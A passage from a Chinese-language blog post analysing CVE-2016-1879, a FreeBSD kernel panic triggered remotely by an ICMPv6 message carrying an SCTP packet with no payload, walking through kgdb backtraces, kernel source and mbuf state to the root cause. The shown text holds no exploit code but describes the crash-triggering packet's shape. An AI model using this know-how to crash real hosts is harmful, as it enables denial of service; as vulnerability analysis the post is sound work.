fault</span><br><span class="line">cpuid = <span class="number">0</span></span><br><span class="line">KDB: <span class="built_in">stack</span> backtrace:</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span> <span class="number">0xffffffff80963000</span> at kdb_backtrace+<span class="number">0x60</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">1</span> <span class="number">0xffffffff80928125</span> at panic+<span class="number">0x155</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">2</span> <span class="number">0xffffffff80d24f1f</span> at trap_fatal+<span class="number">0x38f</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">3</span> <span class="number">0xffffffff80d25238</span> at trap_pfault+<span class="number">0x308</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">4</span> <span class="number">0xffffffff80d2489a</span> at trap+<span class="number">0x47a</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">5</span> <span class="number">0xffffffff80d0a782</span> at calltrap+<span class="number">0x8</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">6</span> <span class="number">0xffffffff80b091ed</span> at sctp6_ctlinput+<span class="number">0xbd</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">7</span> <span class="number">0xffffffff80ade0a5</span> at icmp6_input+<span class="number">0x1bf5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span> <span class="number">0xffffffff80af2b0c</span> at ip6_input+<span class="number">0x5cc</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">9</span> <span class="number">0xffffffff809f44e2</span> at netisr_dispatch_src+<span class="number">0x62</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">10</span> <span class="number">0xffffffff809eb996</span> at ether_demux+<span class="number">0x126</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">11</span> <span class="number">0xffffffff809ec63e</span> at ether_nh_input+<span class="number">0x35e</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">12</span> <span class="number">0xffffffff809f44e2</span> at netisr_dispatch_src+<span class="number">0x62</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">13</span> <span class="number">0xffffffff804de3d9</span> at lem_rxeof+<span class="number">0x489</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">14</span> <span class="number">0xffffffff804ddbb1</span> at lem_handle_rxtx+<span class="number">0x31</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">15</span> <span class="number">0xffffffff80971475</span> at taskqueue_run_locked+<span class="number">0xe5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">16</span> <span class="number">0xffffffff80971f08</span> at taskqueue_thread_loop+<span class="number">0xa8</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">17</span> <span class="number">0xffffffff808f8b6a</span> at fork_exit+<span class="number">0x9a</span></span></span><br><span class="line">Uptime: <span class="number">53</span>m18s</span><br><span class="line">Dumping <span class="number">63</span> out of <span class="number">232</span> MB:.<span class="number">.26</span>%.<span class="number">.51</span>%.<span class="number">.76</span>%</span><br><span class="line"></span><br><span class="line">Reading symbols from /boot/kernel/uhid.ko.symbols...done.</span><br><span class="line">Loaded symbols <span class="keyword">for</span> /boot/kernel/uhid.ko.symbols</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span>  doadump (textdump=&lt;value optimized out&gt;) at pcpu.h:<span class="number">219</span></span></span><br><span class="line"><span class="number">219</span>		__asm(<span class="string">"movq %%gs:%1,%0"</span> : <span class="string">"=r"</span> (td)</span><br><span class="line">(kgdb)</span><br></pre></td></tr></table></figure>
<p>​    这个时候只需要键入bt就可以看到带有调试符的崩溃信息了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) bt</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span>  doadump (textdump=&lt;value optimized out&gt;) at pcpu.h:<span class="number">219</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">1</span>  <span class="number">0xffffffff80927da2</span> in kern_reboot (howto=<span class="number">260</span>) at /usr/src/sys/kern/kern_shutdown.c:<span class="number">452</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">2</span>  <span class="number">0xffffffff80928164</span> in panic (fmt=&lt;value optimized out&gt;) at /usr/src/sys/kern/kern_shutdown.c:<span class="number">759</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">3</span>  <span class="number">0xffffffff80d24f1f</span> in trap_fatal (frame=&lt;value optimized out&gt;, eva=&lt;value optimized out&gt;) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">865</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">4</span>  <span class="number">0xffffffff80d25238</span> in trap_pfault (frame=<span class="number">0xfffffe00003fd250</span>, usermode=&lt;value optimized out&gt;) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">676</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">5</span>  <span class="number">0xffffffff80d2489a</span> in trap (frame=<span class="number">0xfffffe00003fd250</span>) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">440</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">6</span>  <span class="number">0xffffffff80d0a782</span> in calltrap () at /usr/src/sys/amd64/amd64/exception.S:<span class="number">232</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">7</span>  <span class="number">0xffffffff809959f0</span> in m_copydata (m=&lt;value optimized out&gt;, off=&lt;value optimized out&gt;, len=&lt;value optimized out&gt;, cp=&lt;value optimized out&gt;) at /usr/src/sys/kern/uipc_mbuf.c:<span class="number">884</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span>  <span class="number">0xffffffff80b091ed</span> in sctp6_ctlinput (cmd=<span class="number">8</span>, pktdst=<span class="number">0xfffffe00003fd4f0</span>, d=<span class="number">0xfffffe00003fd4a8</span>) at /usr/src/sys/netinet6/sctp6_usrreq.c:<span class="number">409</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">9</span>  <span class="number">0xffffffff80ade0a5</span> in icmp6_input (mp=&lt;value optimized out&gt;, offp=&lt;value optimized out&gt;, proto=&lt;value optimized out&gt;) at /usr/src/sys/netinet6/icmp6.c:<span class="number">1176</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">10</span> <span class="number">0xffffffff80af2b0c</span> in ip6_input (m=<span class="number">0xfffff80002a61d00</span>) at /usr/src/sys/netinet6/ip6_input.c:<span class="number">1019</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">11</span> <span class="number">0xffffffff809f44e2</span> in netisr_dispatch_src (proto=&lt;value optimized out&gt;, source=&lt;value optimized out&gt;, m=<span class="number">0x0</span>) at /usr/src/sys/net/netisr.c:<span class="number">972</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">12</span> <span class="number">0xffffffff809eb996</span> in ether_demux (ifp=&lt;value optimized out&gt;, m=<span class="number">0xfffff80002a61d00</span>) at /usr/src/sys/net/if_ethersubr.c:<span class="number">851</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">13</span> <span class="number">0xffffffff809ec63e</span> in ether_nh_input (m=&lt;value optimized out&gt;) at /usr/src/sys/net/if_ethersubr.c:<span class="number">646</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">14</span> <span class="number">0xffffffff809f44e2</span> in netisr_dispatch_src (proto=&lt;value optimized out&gt;, source=&lt;value optimized out&gt;, m=<span class="number">0x0</span>) at /usr/src/sys/net/netisr.c:<span class="number">972</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">15</span> <span class="number">0xffffffff804de3d9</span> in lem_rxeof (count=&lt;value optimized out&gt;) at /usr/src/sys/dev/e1000/if_lem.c:<span class="number">3824</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">16</span> <span class="number">0xffffffff804ddbb1</span> in lem_handle_rxtx (context=<span class="number">0xfffffe00007df000</span>, pending=&lt;value optimized out&gt;) at /usr/src/sys/dev/e1000/if_lem.c:<span class="number">1440</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">17</span> <span class="number">0xffffffff80971475</span> in taskqueue_run_locked (queue=<span class="number">0xfffff800023f0300</span>) at /usr/src/sys/kern/subr_taskqueue.c:<span class="number">342</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">18</span> <span class="number">0xffffffff80971f08</span> in taskqueue_thread_loop (arg=&lt;value optimized out&gt;) at /usr/src/sys/kern/subr_taskqueue.c:<span class="number">563</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">19</span> <span class="number">0xffffffff808f8b6a</span> in fork_exit (callout=<span class="number">0xffffffff80971e60</span> &lt;taskqueue_thread_loop&gt;, arg=<span class="number">0xfffffe00007e1830</span>, frame=<span class="number">0xfffffe00003fdac0</span>) at /usr/src/sys/kern/kern_fork.c:<span class="number">996</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">20</span> <span class="number">0xffffffff80d0acbe</span> in fork_trampoline () at /usr/src/sys/amd64/amd64/exception.S:<span class="number">606</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">21</span> <span class="number">0x0000000000000000</span> in ?? ()</span></span><br><span class="line">Current language:  <span class="keyword">auto</span>; <span class="function">currently <span class="title">minimal</span></span><br><span class="line"><span class="params">(kgdb)</span></span></span><br></pre></td></tr></table></figure>
<p>​    可以看到0~6都已经是系统的异常处理了。所以我们直接看#7栈。</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) f <span class="number">7</span></span><br><span class="line"><span class="number">#7</span>  <span class="number">0</span>xffffffff<span class="number">809959f</span><span class="number">0</span> <span class="keyword">in</span> m<span class="number">_</span>copydata (m=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, off=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, len=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, cp=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;) at /usr/src/sys/kern/uipc<span class="number">_m</span>buf.c:<span class="number">884</span></span><br><span class="line"><span class="number">884</span>		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>​    打开源码/usr/src/sys/kern/uipc_mbuf.c看m_copydata函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * Copy data from an mbuf chain starting "off" bytes from the beginning,</span><br><span class="line"> * continuing for "len" bytes, into the indicated buffer.</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">m_copydata</span><span class="params">(<span class="keyword">const</span> <span class="keyword">struct</span> mbuf *m, <span class="keyword">int</span> off, <span class="keyword">int</span> len, caddr_t cp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	u_int count;</span><br><span class="line"></span><br><span class="line">	KASSERT(off &gt;= <span class="number">0</span>, (<span class="string">"m_copydata, negative off %d"</span>, off));</span><br><span class="line">	KASSERT(len &gt;= <span class="number">0</span>, (<span class="string">"m_copydata, negative len %d"</span>, len));</span><br><span class="line">	<span class="keyword">while</span> (off &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		KASSERT(m != <span class="literal">NULL</span>, (<span class="string">"m_copydata, offset &gt; size of mbuf chain"</span>));<span class="comment">//第一个m的assert</span></span><br><span class="line">		<span class="keyword">if</span> (off &lt; m-&gt;m_len)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		off -= m-&gt;m_len;</span><br><span class="line">		m = m-&gt;m_next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;	<span class="comment">//884行</span></span><br><span class="line">		KASSERT(m != <span class="literal">NULL</span>, (<span class="string">"m_copydata, length &gt; size of mbuf chain"</span>)); <span class="comment">//885行</span></span><br><span class="line">      	<span class="comment">//这里以下不重要</span></span><br><span class="line">      	<span class="comment">//这里以下不重要</span></span><br><span class="line">		count = min(m-&gt;m_len - off, len);</span><br><span class="line">		bcopy(mtod(m, <span class="keyword">caddr_t</span>) + off, cp, count);</span><br><span class="line">		len -= count;</span><br><span class="line">		cp += count;</span><br><span class="line">		off = <span class="number">0</span>;</span><br><span class="line">		m = m-&gt;m_next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    明显可以看出来是被assert掉了。说明m是一个NULL。但是上面的assert并没有触发。根据代码上下文判断<strong>只有</strong>一个可能。那就是m = m-&gt;next的时候m被赋值成了NULL。说明m-&gt;next是一个NULL。</p>
<p>​    根据线索只能分析出这么多，那么再看上一级调用。看看到底传进来的参数是什么。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) f <span class="number">8</span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span>  <span class="number">0xffffffff80b091ed</span> in sctp6_ctlinput (cmd=<span class="number">8</span>, pktdst=<span class="number">0xfffffe00003fd4f0</span>, d=<span class="number">0xfffffe00003fd4a8</span>) at /usr/src/sys/netinet6/sctp6_usrreq.c:<span class="number">409</span></span></span><br><span class="line"><span class="number">409</span>			m_copydata(ip6cp-&gt;ip6c_m, ip6cp-&gt;ip6c_off, <span class="keyword">sizeof</span>(sh),</span><br></pre></td></tr></table></figure>
<p>​    那么我们需要知道ip6cp的数据。根据源码/usr/src/sys/netinet6/sctp6_usrreq.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">sctp6_ctlinput</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">struct</span> sockaddr *pktdst, <span class="keyword">void</span> *d)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> sctphdr sh;</span><br><span class="line">	<span class="keyword">struct</span> ip6ctlparam *ip6cp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> vrf_id;</span><br><span class="line"></span><br><span class="line">	vrf_id = SCTP_DEFAULT_VRFID;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pktdst-&gt;sa_family != AF_INET6 ||</span><br><span class="line">	    pktdst-&gt;sa_len != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span>)cmd &gt;= PRC_NCMDS)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (PRC_IS_REDIRECT(cmd)) &#123;</span><br><span class="line">		d = <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (inet6ctlerrmap[cmd] == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* if the parameter is from icmp6, decode it. */</span></span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ip6cp = (<span class="keyword">struct</span> ip6ctlparam *)d;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ip6cp = (<span class="keyword">struct</span> ip6ctlparam *)<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ip6cp) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * <span class="doctag">XXX:</span> We assume that when IPV6 is non NULL, M and OFF are</span><br><span class="line">		 * valid.</span><br><span class="line">		 */</span></span><br><span class="line">		<span class="comment">/* check if we can safely examine src and dst ports */</span></span><br><span class="line">		<span class="keyword">struct</span> sctp_inpcb *inp = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sctp_tcb *stcb = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sctp_nets *net = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sockaddr_in6 final;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ip6cp-&gt;ip6c_m == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		bzero(&amp;sh, <span class="keyword">sizeof</span>(sh));</span><br><span class="line">		bzero(&amp;final, <span class="keyword">sizeof</span>(final));</span><br><span class="line">		inp = <span class="literal">NULL</span>;</span><br><span class="line">		net = <span class="literal">NULL</span>;</span><br><span class="line">		m_copydata(ip6cp-&gt;ip6c_m, ip6cp-&gt;ip6c_off, <span class="keyword">sizeof</span>(sh),</span><br><span class="line">		    (<span class="keyword">caddr_t</span>)&amp;sh);</span><br><span class="line">		</span><br><span class="line">      	...</span><br><span class="line">        后面不重要</span><br></pre></td></tr></table></figure>
<p>​    我们可以通过代码 <strong>ip6cp = (struct ip6ctlparam *)d;</strong> 得知，ip6cp就是传入的参数d做了一次类型转换。</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) p *(struct ip6ctlparam *)d</span><br><span class="line"><span class="variable">$1</span> = &#123;ip6c_m = <span class="number">0xfffff80002a61d00</span>, ip6c_icmp6 = <span class="number">0xfffff80002b10038</span>, ip6c_ip6 = <span class="number">0xfffff80002b10040</span>, ip6c_off = <span class="number">88</span>, ip6c_src = <span class="number">0xfffffe00003fd510</span>, ip6c_dst = <span class="number">0xfffffe00003fd540</span>, </span><br><span class="line">  ip6c_finaldst = <span class="number">0xfffff80002b10058</span>, ip6c_cmdarg = <span class="number">0x10000000</span>, ip6c_nxt = <span class="number">132</span> <span class="string">'\204'</span>&#125;</span><br></pre></td></tr></table></figure>
<p>​    我们可以得到ip6cp的数据。m_copydata函数的第一个参数m就是这里的ip6c_m = 0xfffff80002a61d00，数据结构为<strong>struct mbuf</strong>。</p>
<p>​    另外一个要注意的是<strong>ip6c_off = 88</strong>。</p>
<p>​    </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) p *(<span class="keyword">struct</span> mbuf *)<span class="number">0xfffff80002a61d00</span></span><br><span class="line">$<span class="number">2</span> = &#123;m_hdr = &#123;mh_next = <span class="number">0x0</span>, mh_nextpkt = <span class="number">0x0</span>, mh_data = <span class="number">0xfffff80002b10010</span> <span class="string">"`"</span>, mh_len = <span class="number">88</span>, mh_type = <span class="number">1</span>, mh_flags = <span class="number">3</span>&#125;, M_dat = &#123;MH = &#123;MH_pkthdr = &#123;rcvif = <span class="number">0xfffff800023d7800</span>, tags = &#123;</span><br><span class="line">          slh_first = <span class="number">0xfffff80002a5c900</span>&#125;, len = <span class="number">88</span>, flowid = <span class="number">0</span>, csum_flags = <span class="number">0</span>, fibnum = <span class="number">0</span>, cosqos = <span class="number">0</span> <span class="string">'\0'</span>, rsstype = <span class="number">0</span> <span class="string">'\0'</span>, l2hlen = <span class="number">0</span> <span class="string">'\0'</span>, l3hlen = <span class="number">0</span> <span class="string">'\0'</span>, l4hlen = <span class="number">0</span> <span class="string">'\0'</span>, </span><br><span class="line">        l5hlen = <span class="number">0</span> <span class="string">'\0'</span>, PH_per = &#123;eigth = <span class="string">"\000\000\000\000\000\000\000"</span>, sixteen = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, thirtytwo = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, sixtyfour = &#123;<span class="number">0</span>&#125;, unintptr = &#123;<span class="number">0</span>&#125;, ptr = <span class="number">0x0</span>&#125;, PH_loc = &#123;</span><br><span class="line">          eigth = <span class="string">"\000\000\000\000\000\000\000"</span>, sixteen = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, thirtytwo = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, sixtyfour = &#123;<span class="number">0</span>&#125;, unintptr = &#123;<span class="number">0</span>&#125;, ptr = <span class="number">0x0</span>&#125;&#125;, MH_dat = &#123;MH_ext = &#123;ref_cnt = <span class="number">0xfffff80002affb50</span>, </span><br><span class="line">          ext_buf = <span class="number">0xfffff80002b10000</span> <span class="string">""</span>, ext_size = <span class="number">2048</span>, ext_type = <span class="number">6</span>, ext_flags = <span class="number">0</span>, ext_free = <span class="number">0</span>, ext_arg1 = <span class="number">0x0</span>, ext_arg2 = <span class="number">0x0</span>&#125;, </span><br><span class="line">        MH_databuf = <span class="string">"P?\002\000???\000\000?\002\000???\000\b\000\000\006"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">146</span> times&gt;&#125;&#125;, </span><br><span class="line">    M_databuf = <span class="string">"\000x=\002\000???\000ɥ\002\000???X"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">39</span> times&gt;, <span class="string">"P?\002\000???\000\000?\002\000???\000\b\000\000\006"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">146</span> times&gt;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>​    可以看到mh_next=0x0,果然next是null。</p>
<p>​    同时可以看到处理的网络包的len是<strong>88</strong>。我回过头去数了一下抓到的网络包的字节数，除去以太网数据帧的头部信息之外，刚好就是88个字节。</p>
<h1 id="0x05崩溃原因">0x05崩溃原因</h1><p>​    1.根据协议发送的网络包告知系统ICMPv6中包含一个SCTP网络包。但是网络包的PAYLOAD是空的。</p>
<p>​    2.SCTP网络包解析函数 <strong>sctp6_ctlinput</strong> <strong>默认</strong>函数调用者传递来的网络包都是正确的网络包。所以并没有检测参数是否正常，而直接获取数据进行解析。</p>
<p>​    3.前面的包头都已经被分析完成。off与m-&gt;m_len都为88。</p>
<p>​    4.在<strong>m_copydata</strong>调用时,因为并没有payload，所以只用了一个mbuf。mbuf-&gt;next的值为NULL。</p>
<p>​    导致触发了断言，内核崩溃。</p>
<h1 id="0x06后记">0x06后记</h1><p>​    有两点程序开发时的要点需要牢记，在这个bug的分析中，再次体现了他们的重要性。</p>
<p>​    1. 不要默认调用者传递的参数是正确的，要做好异常处理。</p>
<p>​    2. 多用ASSERT，让程序越早崩溃越好。</p>
<h1 id="0x07_参考&amp;感谢">0x07 参考&amp;感谢</h1><p>​    感谢分享：）。</p>
<ol>
<li><p>[FreeBSD Remote DoS Exploit (Demo) (CVE-2016-1879) </p>
<p>(<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html</a>)</p>
</li>
<li><p>freebsd下保存内核崩溃时的信息</p>
<p> (<a href="http://www.jiancool.com/article/479627865/" target="_blank" rel="external">http://www.jiancool.com/article/479627865/</a>)</p>
</li>
<li><p>Enable root Login On FreeBSD 10 </p>
<p>(<a href="http://www.unixmen.com/enable-root-login-ssh-freebsd-10/" target="_blank" rel="external">http://www.unixmen.com/enable-root-login-ssh-freebsd-10/</a>)</p>
</li>
<li><p>icmpv6协议</p>
<p>(<a href="https://zh.wikipedia.org/wiki/ICMPv6" target="_blank" rel="external">https://zh.wikipedia.org/wiki/ICMPv6</a>)</p>
<p>​</p>
</li>
</ol>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2016/02/09/CVE-2016-1879调试&分析/">CVE-2016-1879 调试&amp;分析</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 mrh 的个人博客">mrh</a></p>
        <p><span>发布时间:</span>2016年02月09日 - 17时23分</p>
        <p><span>最后更新:</span>2016年03月23日 - 23时35分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2016/02/09/CVE-2016-1879调试&分析/" title="CVE-2016-1879 调试&amp;分析">http://turingh.github.io/2016/02/09/CVE-2016-1879调试&amp;分析/</a>
            <span class="copy-path" data-clipboard-text="原文: http://turingh.github.io/2016/02/09/CVE-2016-1879调试&amp;分析/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2016/02/19/CVE-2015-7547分析与调试/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          对CVE-2015-7547简单的分析与调试
        
      </div>
    </a>
  
  
    <a href="/2016/01/27/frame-faking/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">frame-faking-介绍-函数调用伪造</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00_漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01_准备工作"><span class="toc-number">2.</span> <span class="toc-text">0x01 准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1_系统安装"><span class="toc-number">2.1.</span> <span class="toc-text">1.1 系统安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2_重编内核"><span class="toc-number">2.2.</span> <span class="toc-text">1.2 重编内核</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3_其他设置"><span class="toc-number">2.3.</span> <span class="toc-text">1.3 其他设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4_网络环境"><span class="toc-number">2.4.</span> <span class="toc-text">1.4 网络环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02漏洞重现"><span class="toc-number">3.</span> <span class="toc-text">0x02漏洞重现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03_攻击包分析"><span class="toc-number">4.</span> <span class="toc-text">0x03 攻击包分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1_分析poc"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 分析poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2_抓包分析"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 抓包分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04_分析VMCORE"><span class="toc-number">5.</span> <span class="toc-text">0x04 分析VMCORE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05崩溃原因"><span class="toc-number">6.</span> <span class="toc-text">0x05崩溃原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06后记"><span class="toc-number">7.</span> <span class="toc-text">0x06后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07_参考&感谢"><span 